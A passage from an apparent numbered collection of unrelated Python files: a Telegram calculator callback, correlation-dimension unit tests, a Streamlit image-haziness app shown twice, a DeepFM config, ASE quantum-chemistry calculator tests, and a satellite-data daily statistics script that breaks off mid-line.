e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "55": "import unittest\nfrom unittest.mock import patch\n\nfrom src.core.cordim import CorDim\nfrom tests.unit.config_test import ConfigTest\n\n\nclass TestCorDimCalculateHeviside(unittest.TestCase, ConfigTest):\n    def setUp(self):\n        self.corDim = CorDim()\n\n    def test_calc_heviside_0(self):\n        r = self.corDim.calc_heviside(10, 20)\n        self.assertEqual(0, r, msg='heviside equals 0 for all negative differences')\n\n    def test_calc_heviside_1(self):\n        r = self.corDim.calc_heviside(20, 10)\n        self.assertEqual(1, r, msg='heviside equals 1 for all positive differences')\n\n    def test_calc_heviside_2(self):\n        r = self.corDim.calc_heviside(-10, -11)\n        self.assertEqual(1, r, msg='heviside equals 1 for all positive differences')\n\n    def test_calc_heviside_3(self):\n        r = self.corDim.calc_heviside(-10, -1)\n        self.assertEqual(0, r, msg='heviside equals 0 for all negative differences')\n\n\nclass TestCorDimCalculateAttractor(unittest.TestCase, ConfigTest):\n    def setUp(self):\n        self.corDim = CorDim()\n\n    def test_calc_attractor_0(self):\n        r = self.corDim.calc_attractor(10, 20)\n        self.assertAlmostEqual(0.76862, r, places=4, msg='normal attractor fails')\n\n    def test_calc_attractor_1(self):\n        r = self.corDim.calc_attractor(0, 20)\n        self.assertAlmostEqual(0.3338, r, places=4, msg='attractor for zero cor func')\n\n    def test_calc_attractor_2(self):\n        r = self.corDim.calc_attractor(10, 0)\n        self.assertAlmostEqual(2.3026, r, places=4, msg='attractor for zero radius')\n\n    def test_calc_attractor_3(self):\n        r = self.corDim.calc_attractor(0, 0)\n        self.assertEqual(1, r, msg='attractor for zero radius and zero cor func')\n\n\nclass TestCorDimCalculateCor(unittest.TestCase, ConfigTest):\n    def setUp(self):\n        self.corDim = CorDim()\n\n    @patch('src.core.apen.ApEn.calculate_distance')\n    @patch('src.core.cordim.CorDim.calc_heviside')\n    def test_calc_cor_func_0(self, mock_cordim_calc_haviside, mock_apen_calc_distance):\n        mock_apen_calc_distance.return_value = 0.3\n        mock_cordim_calc_haviside.return_value=0.4\n        r = self.corDim.calc_cor_func([600,], 5)\n        mock_apen_calc_distance.assert_called_with(600, 600)\n        mock_cordim_calc_haviside.assert_called_with(5, 0.3)\n        self.assertAlmostEqual(0.4, r, places=4, msg='calc cor fails for normal case')\n\n    @patch('src.core.apen.ApEn.calculate_distance')\n    @patch('src.core.cordim.CorDim.calc_heviside')\n    def test_calc_cor_func_1(self, mock_cordim_calc_haviside, mock_apen_calc_distance):\n        r = self.corDim.calc_cor_func([], 5)\n        self.assertEqual(0, r, msg='calc cor fails for empty sequence')\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "56": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Apr 19 10:48:08 2021\n\n@author: Andr\u00c3\u00a9 Vitor\n\"\"\"\n\nimport streamlit as st\nimport numpy as np\nimport cv2 as cv\nimport glob\nfrom functions import *\nimport pandas as pd\nimport os\nfrom PIL import Image, ImageOps\nimport matplotlib.pyplot as plt\n\nst.title('Haziness')\nst.write(\"This web app calculates the Haziness measure.\")\nst.write(\"\"\"\n         It can also calculate RMS, Histogram Spread,\n         Michelson, Weber and Rizzi metrics.\"\"\")\n\ncalc_rms = st.checkbox('RMS')\n# calc_Weber = st.checkbox('Weber')\ncalc_Michelson = st.checkbox('Michelson')\n# calc_Rizzi = st.checkbox('Rizzi')\ncalc_HS = st.checkbox('Histogram Spread')\n\nrms_list = []\n# Weber_list = []\nMichelson_list = []\n# Rizzi_list = []\nHS_list = []\n\nN = st.number_input(\"Select number of iterations: \",min_value=1, value=1000, step=1)\ns = st.number_input(\"Select the size of the patches: \",min_value=1, value=2, step=1)\n\n# import libraries\n# import tkinter as tk\n# from tkinter import filedialog\n\n\n# files = glob.glob(os.path.join(dirname,'/*'))\nmultiple_files = st.file_uploader(\"Select files: \",accept_multiple_files=True)\nif multiple_files is None:\n    st.text(\"No upload\")\nelse:\n    st.text(\"The files are:\")\n    files = [file.name for file in multiple_files]\n    st.text(\"\\n\".join(files))\n\n\nvalues = []\n# @st.cache()\ndef calculations():\n    for file in multiple_files:\n    #     file2 = file.split(\"\\\\\")[1]\n        st.text(f'Calculating for {file.name}')\n    #     file = cv.imread(file, 0)\n\n        img = Image.open(file)\n        img = ImageOps.grayscale(img)\n        img = np.asarray(img)\n        x, y = haziness_mean_std(img, N, s)\n        values.append([file.name, round(x, 4), round(y, 4)])\n\n\n        # Calculate other metrics\n        if calc_rms:\n            rms_list.append(RMS(img))\n    #     if calc_Weber:\n    #         Weber_list.append(Weber(img))\n        if calc_Michelson:\n            Michelson_list.append(Michelson(img))\n    #     if calc_Rizzi:\n    #         Rizzi_list.append(Rizzi(img))\n        if calc_HS:\n            HS_list.append(HS(img))\n\ncalculations()\nDF = pd.DataFrame(values,columns=[\"Name\", \"Haziness\", \"Std\"])\nif calc_rms:\n    DF[\"RMS\"] = rms_list\nif calc_Michelson:\n    DF[\"Michelson\"] = Michelson_list\nif calc_HS:\n    DF[\"HS\"] = HS_list\nDF.sort_values(by=['Name'],inplace=True,ignore_index=True)\nst.write(DF)\n\n\nfig, ax = plt.subplots()\nax.plot(range(len(values)),DF.Haziness,'ok--',label='Haziness')\nif calc_rms:\n    ax.plot(range(len(values)),rms_list,'or--',label='RMS')\nif calc_Michelson:\n    ax.plot(range(len(values)),Michelson_list,'ob--',label='Michelson')\nif calc_HS:\n    ax.plot(range(len(values)),HS_list,'og--',label='HS')\nax.legend()\nst.pyplot(fig)", "57": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Apr 19 10:48:08 2021\n\n@author: Andr\u00c3\u00a9 Vitor\n\"\"\"\n\nimport streamlit as st\nimport numpy as np\nimport cv2 as cv\nimport glob\nfrom functions import *\nimport pandas as pd\nimport os\nfrom PIL import Image, ImageOps\nimport matplotlib.pyplot as plt\n\nst.title('Haziness')\nst.write(\"This web app calculates the Haziness measure.\")\nst.write(\"\"\"\n         It can also calculate RMS, Histogram Spread,\n         Michelson, Weber and Rizzi metrics.\"\"\")\n\ncalc_rms = st.checkbox('RMS')\n# calc_Weber = st.checkbox('Weber')\ncalc_Michelson = st.checkbox('Michelson')\n# calc_Rizzi = st.checkbox('Rizzi')\ncalc_HS = st.checkbox('Histogram Spread')\n\nrms_list = []\n# Weber_list = []\nMichelson_list = []\n# Rizzi_list = []\nHS_list = []\n\nN = st.number_input(\"Select number of iterations: \",min_value=1, value=1000, step=1)\ns = st.number_input(\"Select the size of the patches: \",min_value=1, value=2, step=1)\n\n# import libraries\n# import tkinter as tk\n# from tkinter import filedialog\n\n\n# files = glob.glob(os.path.join(dirname,'/*'))\nmultiple_files = st.file_uploader(\"Select files: \",accept_multiple_files=True)\nif multiple_files is None:\n    st.text(\"No upload\")\nelse:\n    st.text(\"The files are:\")\n    files = [file.name for file in multiple_files]\n    st.text(\"\\n\".join(files))\n\n\nvalues = []\n# @st.cache()\ndef calculations():\n    for file in multiple_files:\n    #     file2 = file.split(\"\\\\\")[1]\n        st.text(f'Calculating for {file.name}')\n    #     file = cv.imread(file, 0)\n\n        img = Image.open(file)\n        img = ImageOps.grayscale(img)\n        img = np.asarray(img)\n        x, y = haziness_mean_std(img, N, s)\n        values.append([file.name, round(x, 4), round(y, 4)])\n\n\n        # Calculate other metrics\n        if calc_rms:\n            rms_list.append(RMS(img))\n    #     if calc_Weber:\n    #         Weber_list.append(Weber(img))\n        if calc_Michelson:\n            Michelson_list.append(Michelson(img))\n    #     if calc_Rizzi:\n    #         Rizzi_list.append(Rizzi(img))\n        if calc_HS:\n            HS_list.append(HS(img))\n\ncalculations()\nDF = pd.DataFrame(values,columns=[\"Name\", \"Haziness\", \"Std\"])\nif calc_rms:\n    DF[\"RMS\"] = rms_list\nif calc_Michelson:\n    DF[\"Michelson\"] = Michelson_list\nif calc_HS:\n    DF[\"HS\"] = HS_list\nDF.sort_values(by=['Name'],inplace=True,ignore_index=True)\nst.write(DF)\n\n\nfig, ax = plt.subplots()\nax.plot(range(len(values)),DF.Haziness,'ok--',label='Haziness')\nif calc_rms:\n    ax.plot(range(len(values)),rms_list,'or--',label='RMS')\nif calc_Michelson:\n    ax.plot(range(len(values)),Michelson_list,'ob--',label='Michelson')\nif calc_HS:\n    ax.plot(range(len(values)),HS_list,'og--',label='HS')\nax.legend()\nst.pyplot(fig)", "58": "# set the path-to-files\nTRAIN_FILE = \"./data/train.csv\"\nTEST_FILE = \"./data/test.csv\"\n\nSUB_DIR = \"./tensorflow_DeepFM/example/output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "59": "import pytest\nimport numpy as np\nfrom ase.build import bulk, molecule\nfrom ase.units import Hartree\n\n\ncalc = pytest.mark.calculator\n\nrequired_quantities = {'eigenvalues',\n                       'fermilevel',\n                       'version',\n                       'forces',\n                       'energy',\n                       'free_energy',\n                       'stress',\n                       'ibz_kpoints',\n                       'kpoint_weights'}\n\n\ndef run(atoms):\n    atoms.get_forces()\n    print(sorted(atoms.calc.results))\n    for key, value in atoms.calc.results.items():\n        if isinstance(value, np.ndarray):\n            print(key, value.shape, value.dtype)\n        else:\n            print(key, value)\n\n    for name in required_quantities:\n        assert name in atoms.calc.results\n\n    return atoms.calc.results\n\n\n@pytest.mark.calculator_lite\n@calc('abinit')\ndef test_si(factory):\n    atoms = bulk('Si')\n    atoms.calc = factory.calc(nbands=4 * len(atoms), kpts=[4, 4, 4])\n    run(atoms)\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.parametrize('pps', ['fhi', 'paw'])\n@calc('abinit')\ndef test_au(factory, pps):\n    atoms = bulk('Au')\n    atoms.calc = factory.calc(\n        pps=pps,\n        nbands=10 * len(atoms),\n        tsmear=0.1,\n        occopt=3,\n        kpts=[2, 2, 2],\n        pawecutdg=6.0 * Hartree,\n    )\n    # Somewhat awkward to set pawecutdg also when we are not doing paw,\n    # but it's an error to pass None as pawecutdg.\n    run(atoms)\n\n\n@pytest.fixture\ndef fe_atoms():\n    return bulk('Fe')\n\n\ndef getkwargs(**kw):\n    return dict(nbands=8, kpts=[2, 2, 2])\n\n\n@pytest.mark.calculator_lite\n@calc('abinit', occopt=7, **getkwargs())\n@calc('abinit', spinmagntarget=2.3, **getkwargs())\ndef test_fe_magmom(factory, fe_atoms):\n    fe_atoms.calc = factory.calc()\n    run(fe_atoms)\n\n\n@calc('abinit', nbands=8)\ndef test_h2o(factory):\n    atoms = molecule('H2O', vacuum=2.5)\n    atoms.calc = factory.calc()\n    run(atoms)\n\n\n@calc('abinit', nbands=8, occopt=7)\ndef test_o2(factory):\n    atoms = molecule('O2', vacuum=2.5)\n    atoms.calc = factory.calc()\n    run(atoms)\n    magmom = atoms.get_magnetic_moment()\n    assert magmom == pytest.approx(2, 1e-2)\n    print('magmom', magmom)\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manykpts(factory):\n    atoms = bulk('Au') * (2, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.symbols[:2] = 'Cu'\n    atoms.calc = factory.calc(nbands=len(atoms) * 7, kpts=[8, 8, 8])\n    run(atoms, 'manykpts')\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manyatoms(factory):\n    atoms = bulk('Ne', cubic=True) * (4, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.calc = factory.calc(nbands=len(atoms) * 5)\n    run(atoms, 'manyatoms')\n", "60": "\"\"\"Tests for the CP2K ASE calulator.\n\nhttp://www.cp2k.org\nAuthor: Ole Schuett \n\"\"\"\n\nfrom ase.build import molecule\nfrom ase.optimize import BFGS\nimport pytest\nfrom ase.calculators.calculator import CalculatorSetupError\nfrom ase import units\nfrom ase.atoms import Atoms\nfrom ase.md.velocitydistribution import MaxwellBoltzmannDistribution\nfrom ase.md.verlet import VelocityVerlet\n\n\n@pytest.fixture\ndef atoms():\n    return molecule('H2', vacuum=2.0)\n\n\ndef test_geoopt(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(label='test_H2_GOPT', print_level='LOW')\n    atoms.calc = calc\n\n    with BFGS(atoms, logfile=None) as gopt:\n        gopt.run(fmax=1e-6)\n\n    dist = atoms.get_distance(0, 1)\n    dist_ref = 0.7245595\n    assert (dist - dist_ref) / dist_ref < 1e-7\n\n    energy_ref = -30.7025616943\n    energy = atoms.get_potential_energy()\n    assert (energy - energy_ref) / energy_ref < 1e-10\n\n\ndef test_h2_lda(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(label='test_H2_LDA')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -30.6989595886\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_h2_libxc(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(\n        xc='XC_GGA_X_PBE XC_GGA_C_PBE',\n        pseudo_potential=\"GTH-PBE\",\n        label='test_H2_libxc')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -31.591716529642\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_h2_ls(cp2k_factory, atoms):\n    inp = \"\"\"&FORCE_EVAL\n               &DFT\n                 &QS\n                   LS_SCF ON\n                 &END QS\n               &END DFT\n             &END FORCE_EVAL\"\"\"\n    calc = cp2k_factory.calc(label='test_H2_LS', inp=inp)\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -30.6989581747\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 5e-7\n\n\ndef test_h2_pbe(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(xc='PBE', label='test_H2_PBE')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -31.5917284949\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_md(cp2k_factory):\n    calc = cp2k_factory.calc(label='test_H2_MD')\n    positions = [(0, 0, 0), (0, 0, 0.7245595)]\n    atoms = Atoms('HH', positions=positions, calculator=calc)\n    atoms.center(vacuum=2.0)\n\n    MaxwellBoltzmannDistribution(atoms, temperature_K=0.5 * 300,\n                                 force_temp=True)\n    energy_start = atoms.get_potential_energy() + atoms.get_kinetic_energy()\n    with VelocityVerlet(atoms, 0.5 * units.fs) as dyn:\n        dyn.run(20)\n\n    energy_end = atoms.get_potential_energy() + atoms.get_kinetic_energy()\n    assert abs(energy_start - energy_end) < 1e-4\n\n\ndef test_o2(cp2k_factory):\n    calc = cp2k_factory.calc(\n        label='test_O2', uks=True, cutoff=150 * units.Rydberg,\n        basis_set=\"SZV-MOLOPT-SR-GTH\")\n    o2 = molecule('O2', calculator=calc)\n    o2.center(vacuum=2.0)\n    energy = o2.get_potential_energy()\n    energy_ref = -861.057011375\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_restart(cp2k_factory, atoms):\n    calc = cp2k_factory.calc()\n    atoms.calc = calc\n    atoms.get_potential_energy()\n    calc.write('test_restart')  # write a restart\n    calc2 = cp2k_factory.calc(restart='test_restart')  # load a restart\n    assert not calc2.calculation_required(atoms, ['energy'])\n\n\ndef test_unknown_keywords(cp2k_factory):\n    with pytest.raises(CalculatorSetupError):\n        cp2k_factory.calc(dummy_nonexistent_keyword='hello')\n", "61": "import pytest\nimport numpy as np\nfrom ase.constraints import FixAtoms\n\n\ncalc = pytest.mark.calculator\n\n\n@pytest.fixture\ndef calc_settings():\n    \"\"\"Some simple fast calculation settings\"\"\"\n    return dict(xc='lda',\n                prec='Low',\n                algo='Fast',\n                setups='minimal',\n                ismear=0,\n                nelm=1,\n                sigma=0.1,\n                istart=0,\n                ibrion=5,\n                nfree=2,\n                potim=0.05,\n                gamma=True,\n                txt=\"-\",\n                lwave=False,\n                lcharg=False)\n\n\n@calc('vasp')\ndef test_vasp_freq(factory, atoms_nh3, calc_settings):\n    \"\"\"\n    Run some VASP tests to ensure that the frequency aspects of the\n    calculator work. This is conditional on the existence of the\n    VASP_COMMAND or VASP_SCRIPT environment variables\n\n    Tests read_vib_freq and get_vibrations against each other.\n    \"\"\"\n    calc = factory.calc(**calc_settings)\n    mol = atoms_nh3\n    # one constraint\n    c = FixAtoms(indices=[atom.index for atom in mol if atom.symbol == 'N'])\n    mol.set_constraint(c)\n    mol.calc = calc\n    en = mol.get_potential_energy()\n    assert isinstance(en, float)\n\n    n_free = 3 * (len(mol) - 1)  # one constraint\n\n    e, i_e = calc.read_vib_freq()\n    i_e = [complex(0, x) for x in i_e]\n    assert len(e) + len(i_e) == n_free\n    assert i_e\n    outcar_data = i_e[-1::-1] + e[-1::-1]\n\n    vib_obj = calc.get_vibrations()\n    vib_data = vib_obj.get_energies() * 1000  # to meV\n    np.testing.assert_allclose(vib_data, outcar_data, rtol=1e-6)\n    # Cleanup\n    calc.clean()\n", "62": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"Temporary program, calculate min, max, std, avg of one day obc data.\n\nUsage:\n    calc_daily.py --sat=fy3c --ins=mwts --nwp=t639 --date=now\n\nArguments:\n    sat: the satellite you want to calc, fy3c\n    ins: the insatrument you want to calc, mwts\n    nwp: t639 or ncep\n    date: calc for special date. YYYY-mm-dd like 2014-04-24 [default: now]\n\n\"\"\"\n\n__author__ = 'gumeng'\n\n# Copyright (c) 2014, shinetek.\n# All rights reserved.    \n#    \n# work flow:\n# crontabed every day 00:30, then calc, save result to db.\n#         \n# /usr/bin/python /home/fymonitor/MONITORFY3C/py2/bin/calc_daily.py \n# --sat=fy3c --ins=mwts --nwp=t639 --date=now\n# >> /home/fymonitor/DATA/LOG/calc_daily.py.log 2>&1\n#                         \n# date          author    changes\n# 2014-08-09    gumeng    create\n\nimport os\nimport sys\nimport time\nimport numpy\nimport shutil\nimport signal\nimport commands\nimport warnings\nimport MySQLdb\nimport h5py as h5\nfrom datetime import timedelta\nfrom multiprocessing import Pool \n\nwarnings.filterwarnings('ignore', category = MySQLdb.Warning)\n\ntimeuse_begin = time.time()\n\nsys.path.append('/home/fymonitor/MONITORFY3C/py2/conf')\nconf = __import__('conf')\ncommon = __import__('common')\ndocopt = __import__('docopt')\n\n# set read-only global variables.\n\narguments = docopt.docopt(__doc__)\nsat = arguments['--sat'].lower()\nins = arguments['--ins'].lower()\nnwp = arguments['--nwp'].lower()\ncalc_date = arguments['--date'].lower()\n\nins_conf_file = sat.upper() + '_' + ins.upper() + '_CONF'\nins_conf = __import__(ins_conf_file)\n\nif sat not in conf.support_sat_ins or ins not in conf.support_sat_ins[sat]:\n    print 'sat or ins setting is NOT found in conf.py'\n    sys.exit(0)\n    \npid = os.getpid()\nfname = os.path.splitext(os.path.basename(os.path.realpath(__file__) ) )[0]\nlog_tag = fname + '.' + sat + '.' + ins + '.' + str(pid)\nmy_name = common.get_local_hostname()\nmy_tag = my_name+'.'+log_tag\nmy_pidfile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.pid'\nmy_alivefile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.alive'\nmy_log = conf.log_path + '/' + my_name + '.' # just prefix: /log/path/prefix.\n\n#get the correct time span.\nif calc_date == 'now':\n    calc_date = common.utc_YmdH()\nelse:\n    calc_date += '-01' # 2014-08-02-01\ntimespan = common.get_calc_timespan(calc_date, '24')\n# timespan = common.get_last_mon_calc_timespan(timespan)\ntime_tag = timespan['begin_str'] + '`' + timespan['end_str'] + '`'\n\n# mysql tables we should calc\nmy_channel_table = []\nmy_obc_table = []\nmy_calculate_table=[]\n\ncommon.wt_file(my_pidfile, str(pid))\ncommon.info(my_log, log_tag, time_tag + 'program start')\n\n# Deal with signal.\ndef signal_handler(signum, frame):\n    msg = 'FAILED`recv signal ' + str(signum) + '. exit now.'\n    common.info(my_log, log_tag, time_tag + msg)\n\n    if os.path.isfile(my_pidfile):\n        os.remove(my_pidfile)\n    \n    sys.exit(0)\n\n# for each obc setting, calc and insert to STAT.\ndef calc_just_obc():\n    if len(my_obc_table) <= 0:\n        return True\n    \n    \n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'], \n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor()\n    except MySQLdb.Error, e:\n        msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n        \n    for one_sds in ins_conf.obc_to_db.values():\n        for one_column in xrange(1, one_sds['columns'] + 1):\n            db_field = one_sds['db_field']\n            if one_sds['columns'] is not 1:\n                db_field += str(one_column)\n            \n            calc_sql = common.get_calc_daily_sql(db_field, my_obc_table,\n                                                 one_sds['fill_value'],\n                                                 conf.calc_daily_prefix_sql,\n                                                  conf.calc_daily_subsql,\n                                                 conf.calc_daily_postfix_sql)\n            common.debug(my_log, log_tag, time_tag + calc_sql)\n            try:\n                conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                cur.execute(calc_sql)\n                ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                conn.select_db(conf.db_setting['stat_db'])\n                data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                sql_data = [db_field, ret[0][0] ]\n                sql_data.extend(data)\n                cur.execute(daily_sql % tuple(sql_data))\n                conn.commit()\n            except MySQLdb.Error, e:\n                msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n                    + ']: ' + e.args[1]              \n                common.warning(my_log, log_tag, time_tag + msg)\n    if(ins!='mwri'):   \n        for one_sds in ins_conf.calc_to_db.values():\n            for one_column in xrange(1, one_sds['columns'] + 1):\n                db_field = one_sds['db_field']\n                if one_sds['columns'] is not 1:\n                    db_field += str(one_column)\n            \n                calc_sql = common.get_calc_daily_sql(db_field, my_calculate_table,\n                                                 one_sds['fill_value'],\n                                                 conf.calc_daily_prefix_sql,\n                                                  conf.calc_daily_subsql,\n                                                 conf.calc_daily_postfix_sql)\n                common.debug(my_log, log_tag, time_tag + calc_sql)\n                try:\n                    conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                    cur.execute(calc_sql)\n                    ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                    conn.select_db(conf.db_setting['stat_db'])\n                    data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                    sql_data = [db_field, ret[0][0] ]\n                    sql_data.extend(data)\n                    cur.execute(daily_sql % tuple(sql_data))\n                    conn.commit()\n                except MySQLdb.Error, e:\n                    msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n                    + ']: ' + e.args[1]              \n                    common.warning(my_log, log_tag, time_tag + msg)\n\n    try:\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n\n    return True\n\n# for each obc setting, calc and insert to STAT.\ndef calc_one_channel(channel):\n    if len(my_channel_table) <= 0:\n        return True\n    \n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor()\n    except MySQLdb.Error, e:\n        msg = 'calc_one_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n            + str(e.args[0]) + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n        \n    for one_sds in ins_conf.obc_3dim_to_db.values():\n        for one_column in xrange(1, one_sds['columns'] + 1):\n            db_field = one_sds['db_field']\n            if one_sds['columns'] is not 1:\n                db_field += str(one_column)\n            \n            calc_sql = common.get_calc_daily_channel_sql(channel,\n                                                 db_field, my_channel_table,\n                                                 one_sds['fill_value'],\n                                                 conf.calc_daily_prefix_sql,\n                                                 conf.calc_daily_channel_subsql,\n                                                 conf.calc_daily_postfix_sql)\n            common.debug(my_log, log_tag, time_tag + calc_sql)\n            try:\n                conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                cur.execute(calc_sql)\n                ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                conn.select_db(conf.db_setting['stat_db'])\n                data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                sql_data = [db_field, channel, ret[0][0] ]\n                sql_data.extend(data)\n                cur.execute(daily_channel_sql % tuple(sql_data))\n                conn.commit()\n            except MySQLdb.Error, e:\n                msg = 'calc_one_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n                    + str(e.args[0]) + ']: ' + e.args[1]              \n                common.warning(my_log, log_tag, time_tag + msg)\n\n    #try:\n    #    cur.close()\n    #    conn.close()\n    #except MySQLdb.Error, e:\n    #    msg = 'calc_one_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n    #        + str(e.args[0]) + ']: ' + e.args[1]              \n    #    common.err(my_log, log_tag, time_tag + msg)\n    #    return False\n\n    if(ins=='mwhs'):\n        for one_sds in ins_conf.calc_3dim_to_db.values():\n            for one_column in xrange(1, one_sds['columns'] + 1):\n                db_field = one_sds['db_field']\n                if one_sds['columns'] is not 1:\n                    db_field += str(one_column)\n            \n                calc_sql = common.get_calc_daily_channel_sql(channel,\n                                                     db_field, my_calc_channel_table,\n                                                     one_sds['fill_value'],\n                                                     conf.calc_daily_prefix_sql,\n                                                     conf.calc_daily_channel_subsql,\n                                                     conf.calc_daily_postfix_sql)\n                common.debug(my_log, log_tag, time_tag + calc_sql)\n                try:\n                    conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                    cur.execute(calc_sql)\n                    ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                    conn.select_db(conf.db_setting['stat_db'])\n                    data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                    sql_data = [db_field, channel, ret[0][0] ]\n                    sql_data.extend(data)\n                    cur.execute(daily_channel_sql % tuple(sql_data))\n                    conn.commit()\n                except MySQLdb.Error, e:\n                    msg = 'calc_one_calc_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n                        + str(e.args[0]) + ']: ' + e.args[1]              \n                    common.warning(my_log, log_tag, time_tag + msg)\n            #print'channel table list'\n            #print calc_sql\n\n        try:\n            cur.close()\n            conn.close()\n        except MySQLdb.Error, e:\n            msg = 'calc_one_calc_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n                + str(e.args[0]) + ']: ' + e.args[1]  \n            print msg            \n            common.err(my_log, log_tag, time_tag + msg)\n            return False\n    \n\n    \n\n    return True\n\ndef calc_daily(input):\n    if input == 'just_obc':\n        return calc_just_obc()\n    else:\n        return calc_one_channel(input)\n\n# register signal function.\nsignal.signal(signal.SIGTERM, signal_handler)   \nsignal.signal(signal.SIGINT, signal_handler)      \n\n# make sure ONLY ONE prog exist. kill other same program, avoiding hang.\n# we do NOT grep --date=2014-04-27-18 for convenience.\ncmd = conf.ps + ' -elf | ' + conf.grep + ' ' + conf.bin_path + ' | ' \\\n\t+ conf.grep + ' -v grep | ' + conf.grep + ' -v tail | ' + 